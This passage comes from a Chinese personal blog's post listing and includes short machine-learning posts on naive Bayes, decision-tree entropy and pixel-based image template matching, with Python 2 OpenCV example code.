np.array(x)</span><br><span class="line">    myy = np.array(y)</span><br><span class="line">    <span class="keyword">return</span> np.sqrt(np.<span class="built_in">sum</span>((myx - myy) * (myx - myy)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_img</span>(<span class="params">imgpath</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    handle_img</span></span><br><span class="line"><span class="string">    :param imgpath:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    myimg1 = cv2.imread(imgpath)</span><br><span class="line"></span><br><span class="line">    cv2.namedWindow(<span class="string">&#x27;img1&#x27;</span>)</span><br><span class="line">    cv2.imshow(<span class="string">&#x27;img1&#x27;</span>, myimg1)</span><br><span class="line">    cv2.waitKey()</span><br><span class="line">    cv2.destroyAllWindows()</span><br><span class="line"></span><br><span class="line">    w = myimg1.shape[<span class="number">1</span>]</span><br><span class="line">    h = myimg1.shape[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    sz1 = w</span><br><span class="line">    sz0 = h</span><br><span class="line"></span><br><span class="line">    flag = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    myimg2 = np.zeros((sz0, sz1, <span class="number">3</span>), np.uint8)</span><br><span class="line">    black = np.array([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">    white = np.array([<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>])</span><br><span class="line">    centercolor = np.array([<span class="number">125</span>, <span class="number">125</span>, <span class="number">125</span>])</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> xrange(sz0 - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(sz1 - <span class="number">1</span>):</span><br><span class="line">            myhere = myimg1[y, x, :]</span><br><span class="line">            mydown = myimg1[y + <span class="number">1</span>, x, :]</span><br><span class="line">            myright = myimg1[y, x + <span class="number">1</span>, :]</span><br><span class="line"></span><br><span class="line">            lmyhere = myhere</span><br><span class="line">            lmyright = myright</span><br><span class="line">            lmydown = mydown</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> get_euclidean_distance(lmyhere, lmydown) &gt; flag <span class="keyword">and</span> get_euclidean_distance(lmyhere, lmyright) &gt; flag:</span><br><span class="line">                myimg2[y, x, :] = black</span><br><span class="line">            <span class="keyword">elif</span> get_euclidean_distance(lmyhere, lmydown) &lt;= flag <span class="keyword">and</span> get_euclidean_distance(lmyhere, lmyright) &lt;= flag:</span><br><span class="line">                myimg2[y, x, :] = white</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                myimg2[y, x, :] = centercolor</span><br><span class="line"></span><br><span class="line">    cv2.namedWindow(<span class="string">&#x27;img2&#x27;</span>)</span><br><span class="line">    cv2.imshow(<span class="string">&#x27;img2&#x27;</span>, myimg2)</span><br><span class="line">    cv2.waitKey()</span><br><span class="line">    cv2.destroyAllWindows()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    imgpath = <span class="string">&quot;/home/abc/Projects/machine_learning/img/test4.png&quot;</span></span><br><span class="line">    handle_img(imgpath)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="http://blog.sina.com.cn/s/blog_52510b1d01015nrg.html">http://blog.sina.com.cn/s/blog_52510b1d01015nrg.html</a></p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/12/09/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/12/09/1.html" class="post-title-link" itemprop="url">朴素贝叶斯分类</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-12-09 00:00:00" itemprop="dateCreated datePublished" datetime="2016-12-09T00:00:00+00:00">2016-12-09</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <ol start="0">
<li>写在前面的话</li>
<li>数学原理</li>
<li>准备流程</li>
<li>贝叶斯分类器</li>
<li>Laplace校准</li>
<li>商品标题分类</li>
<li>自提问解答</li>
<li>分类器总结</li>
</ol>
<hr>
<h2 id="0-写在前面的话"><a href="#0-写在前面的话" class="headerlink" title="0. 写在前面的话"></a>0. 写在前面的话</h2><p>当我在写这篇文章的时候是在第二遍学习朴素贝叶斯分类算法了，后面或许还会有更多实践才能深刻的理解。<br>朴素贝叶斯是一种构建分类器的方法，其样本的每个特征之间都是互相独立的，这样我们可以通过多个特征对应的分类确定样本的所属分类的概率。</p>
<h2 id="1-数学原理"><a href="#1-数学原理" class="headerlink" title="1. 数学原理"></a>1. 数学原理</h2><p>若一个样本有n个特征，分别用<code>x1,x2,...xn</code>表示，将其划分到yk的可能性<br>$$ P(yk|x1,x2,…xn)&#x3D;P(yk)P(x1|yk) P(x2|yk)…P(xn|yk) $$</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/11/30/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/11/30/1.html" class="post-title-link" itemprop="url">图像匹配算法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-11-30 10:00:01" itemprop="dateCreated datePublished" datetime="2016-11-30T10:00:01+00:00">2016-11-30</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><strong>图像匹配算法</strong>基于像素比较求和实现。</p>
<h4 id="差分矩阵求和"><a href="#差分矩阵求和" class="headerlink" title="差分矩阵求和"></a>差分矩阵求和</h4><p>通过计算两个图像矩阵数据之间的差异分析图像的相似性，然后设置阀值进行比较，公式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">差分矩阵 = 图像A矩阵数据 - 图像B矩阵数据</span><br></pre></td></tr></table></figure>

<p>Python实现如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_pic_location</span>(<span class="params">img, findimg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    show_pic_location</span></span><br><span class="line"><span class="string">    :param img:</span></span><br><span class="line"><span class="string">    :param findimg:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    w = img.shape[<span class="number">1</span>]</span><br><span class="line">    h = img.shape[<span class="number">0</span>]</span><br><span class="line">    fw = findimg.shape[<span class="number">1</span>]</span><br><span class="line">    fh = findimg.shape[<span class="number">0</span>]</span><br><span class="line">    findpt = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> now_h <span class="keyword">in</span> xrange(h - fh):</span><br><span class="line">        <span class="keyword">for</span> now_w <span class="keyword">in</span> xrange(w - fw):</span><br><span class="line">            comp_tz = img[now_h:now_h + fh, now_w: now_w + fw, :] - findimg</span><br><span class="line">            <span class="keyword">if</span> np.<span class="built_in">sum</span>(comp_tz) &lt; <span class="number">1</span>:</span><br><span class="line">                findpt = now_w, now_h</span><br><span class="line">    <span class="keyword">if</span> findpt <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        cv2.rectangle(img, findpt, (findpt[<span class="number">0</span>] + fw, findpt[<span class="number">1</span>] + fh), (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h4 id="差分矩阵均值"><a href="#差分矩阵均值" class="headerlink" title="差分矩阵均值"></a>差分矩阵均值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_pic_location</span>(<span class="params">img, findimg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    show_pic_location</span></span><br><span class="line"><span class="string">    :param img:</span></span><br><span class="line"><span class="string">    :param findimg:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    w = img.shape[<span class="number">1</span>]</span><br><span class="line">    h = img.shape[<span class="number">0</span>]</span><br><span class="line">    fw = findimg.shape[<span class="number">1</span>]</span><br><span class="line">    fh = findimg.shape[<span class="number">0</span>]</span><br><span class="line">    findpt = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> now_h <span class="keyword">in</span> xrange(h - fh):</span><br><span class="line">        <span class="keyword">for</span> now_w <span class="keyword">in</span> xrange(w - fw):</span><br><span class="line">            comp_tz = img[now_h:now_h + fh, now_w: now_w + fw, :] - findimg</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(np.mean(comp_tz)) &lt; <span class="number">20</span>:</span><br><span class="line">                findpt = now_w, now_h</span><br><span class="line">    <span class="keyword">if</span> findpt <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        cv2.rectangle(img, findpt, (findpt[<span class="number">0</span>] + fw, findpt[<span class="number">1</span>] + fh), (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="欧氏距离匹配"><a href="#欧氏距离匹配" class="headerlink" title="欧氏距离匹配"></a>欧氏距离匹配</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_pic_location</span>(<span class="params">img, findimg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    show_pic_location</span></span><br><span class="line"><span class="string">    :param img:</span></span><br><span class="line"><span class="string">    :param findimg:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    w = img.shape[<span class="number">1</span>]</span><br><span class="line">    h = img.shape[<span class="number">0</span>]</span><br><span class="line">    fw = findimg.shape[<span class="number">1</span>]</span><br><span class="line">    fh = findimg.shape[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    minds = <span class="number">1e8</span></span><br><span class="line">    mincb_h = <span class="number">0</span></span><br><span class="line">    mincb_w = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> now_h <span class="keyword">in</span> xrange(h - fh):</span><br><span class="line">        <span class="keyword">for</span> now_w <span class="keyword">in</span> xrange(w - fw):</span><br><span class="line">            my_img = img[now_h:now_h + fh, now_w: now_w + fw, :]</span><br><span class="line">            my_findimg = findimg</span><br><span class="line">            myx = np.array(my_img)</span><br><span class="line">            myy = np.array(my_findimg)</span><br><span class="line">            dis = np.sqrt(np.<span class="built_in">sum</span>((myx - myy) * (myx - myy)))</span><br><span class="line">            <span class="keyword">if</span> dis &lt; minds:</span><br><span class="line">                mincb_h = now_h</span><br><span class="line">                mincb_w = now_w</span><br><span class="line">                minds = dis</span><br><span class="line">                <span class="built_in">print</span> mincb_h, mincb_w, minds</span><br><span class="line"></span><br><span class="line">    findpt = mincb_w, mincb_h</span><br><span class="line">    cv2.rectangle(img, findpt, (findpt[<span class="number">0</span>] + fw, findpt[<span class="number">1</span>] + fh), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h4 id="添加噪音"><a href="#添加噪音" class="headerlink" title="添加噪音"></a>添加噪音</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_noise</span>(<span class="params">img</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    add_noise</span></span><br><span class="line"><span class="string">    :param img:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    count = <span class="number">50000</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(count):</span><br><span class="line">        xi = <span class="built_in">int</span>(np.random.uniform(<span class="number">0</span>, img.shape[<span class="number">1</span>]))</span><br><span class="line">        xj = <span class="built_in">int</span>(np.random.uniform(<span class="number">0</span>, img.shape[<span class="number">0</span>]))</span><br><span class="line">        img[xj, xi, <span class="number">0</span>] = <span class="number">255</span> * np.random.rand()</span><br><span class="line">        img[xj, xi, <span class="number">1</span>] = <span class="number">255</span> * np.random.rand()</span><br><span class="line">        img[xj, xi, <span class="number">2</span>] = <span class="number">255</span> * np.random.rand()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p><strong>原始图像</strong><br><img src="/resource/img/6ea38a619835b9e4.png" alt="原始图像"></p>
<p><strong>待匹配图像</strong></p>
<p><img src="/resource/img/c3a93583f132dc2d.png" alt="待匹配图像"></p>
<p><strong>加噪点匹配图像</strong></p>
<p><img src="/resource/img/c9ea916ed73ba807.png" alt="加入噪点匹配图像"></p>
<p><strong>旋转加噪点匹配图像</strong></p>
<p><img src="/resource/img/51e441e03e213e32.png" alt="旋转加噪点匹配图像"></p>
<p>完整代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@author: abc</span></span><br><span class="line"><span class="string">@file: euclidean_distance.py</span></span><br><span class="line"><span class="string">@date: 2016-12-09</span></span><br><span class="line"><span class="string">@desc: 欧式距离匹配</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">__author__ = <span class="string">&quot;abc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_pic_location</span>(<span class="params">img, findimg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    show_pic_location</span></span><br><span class="line"><span class="string">    :param img:</span></span><br><span class="line"><span class="string">    :param findimg:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    w = img.shape[<span class="number">1</span>]</span><br><span class="line">    h = img.shape[<span class="number">0</span>]</span><br><span class="line">    fw = findimg.shape[<span class="number">1</span>]</span><br><span class="line">    fh = findimg.shape[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    minds = <span class="number">1e8</span></span><br><span class="line">    mincb_h = <span class="number">0</span></span><br><span class="line">    mincb_w = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> now_h <span class="keyword">in</span> xrange(h - fh):</span><br><span class="line">        <span class="keyword">for</span> now_w <span class="keyword">in</span> xrange(w - fw):</span><br><span class="line">            my_img = img[now_h:now_h + fh, now_w: now_w + fw, :]</span><br><span class="line">            my_findimg = findimg</span><br><span class="line">            dis = get_euclidean_distance(my_img, my_findimg)</span><br><span class="line">            <span class="keyword">if</span> dis &lt; minds:</span><br><span class="line">                mincb_h = now_h</span><br><span class="line">                mincb_w = now_w</span><br><span class="line">                minds = dis</span><br><span class="line">                <span class="built_in">print</span> mincb_h, mincb_w, minds</span><br><span class="line"></span><br><span class="line">    findpt = mincb_w, mincb_h</span><br><span class="line">    cv2.rectangle(img, findpt, (findpt[<span class="number">0</span>] + fw, findpt[<span class="number">1</span>] + fh), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_euclidean_distance</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算欧氏距离</span></span><br><span class="line"><span class="string">    :param x:</span></span><br><span class="line"><span class="string">    :param y:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    myx = np.array(x)</span><br><span class="line">    myy = np.array(y)</span><br><span class="line">    <span class="keyword">return</span> np.sqrt(np.<span class="built_in">sum</span>((myx - myy) * (myx - myy)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_noise</span>(<span class="params">img</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    add_noise</span></span><br><span class="line"><span class="string">    :param img:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    count = <span class="number">50000</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(count):</span><br><span class="line">        xi = <span class="built_in">int</span>(np.random.uniform(<span class="number">0</span>, img.shape[<span class="number">1</span>]))</span><br><span class="line">        xj = <span class="built_in">int</span>(np.random.uniform(<span class="number">0</span>, img.shape[<span class="number">0</span>]))</span><br><span class="line">        img[xj, xi, <span class="number">0</span>] = <span class="number">255</span> * np.random.rand()</span><br><span class="line">        img[xj, xi, <span class="number">1</span>] = <span class="number">255</span> * np.random.rand()</span><br><span class="line">        img[xj, xi, <span class="number">2</span>] = <span class="number">255</span> * np.random.rand()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_img</span>(<span class="params">imgpath, imgpath1, imgpath2</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    handle_img</span></span><br><span class="line"><span class="string">    :param imgpath:</span></span><br><span class="line"><span class="string">    :param imgpath1:</span></span><br><span class="line"><span class="string">    :param imgpath2:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    myimg = cv2.imread(imgpath)</span><br><span class="line">    myimg1 = cv2.imread(imgpath1)</span><br><span class="line">    myimg2 = cv2.imread(imgpath2)</span><br><span class="line"></span><br><span class="line">    add_noise(myimg)</span><br><span class="line"></span><br><span class="line">    myimg = show_pic_location(myimg, myimg1)</span><br><span class="line">    myimg = show_pic_location(myimg, myimg2)</span><br><span class="line"></span><br><span class="line">    cv2.namedWindow(<span class="string">&#x27;img&#x27;</span>)</span><br><span class="line">    cv2.imshow(<span class="string">&#x27;img&#x27;</span>, myimg)</span><br><span class="line">    cv2.waitKey()</span><br><span class="line">    cv2.destroyAllWindows()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    imgpath = <span class="string">&quot;/home/abc/Projects/machine_learning/img/test_r45.png&quot;</span></span><br><span class="line">    imgpath1 = <span class="string">&quot;/home/abc/Projects/machine_learning/img/test_1.png&quot;</span></span><br><span class="line">    imgpath2 = <span class="string">&quot;/home/abc/Projects/machine_learning/img/test_2.png&quot;</span></span><br><span class="line">    handle_img(imgpath, imgpath1, imgpath2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/10/30/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/10/30/1.html" class="post-title-link" itemprop="url">决策树</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-10-30 00:00:00" itemprop="dateCreated datePublished" datetime="2016-10-30T00:00:00+00:00">2016-10-30</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>简单解释：<strong>熵</strong> 为信息的期望值，计算公式如下。</p>
<p>$$ info(D) &#x3D; -\sum_{i&#x3D;1}^m p_i log_2(p_i) $$</p>
<p><strong>信息增益</strong> 是指在划分数据集之前之后信息发生的变化。对信息按属性A划分后取得的熵。<br>$$ info_A(D) &#x3D; \sum_{j&#x3D;1}^v \frac{|D_j|}{|D|}info(D_j) $$</p>
<p>计算两者之间的变化就是信息增益。<br>$$ gain(A) &#x3D; info(D) - info_A(D) $$</p>
<p>如下算法计算最大信息增益。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /data/sever/python/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">决策树算法</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> 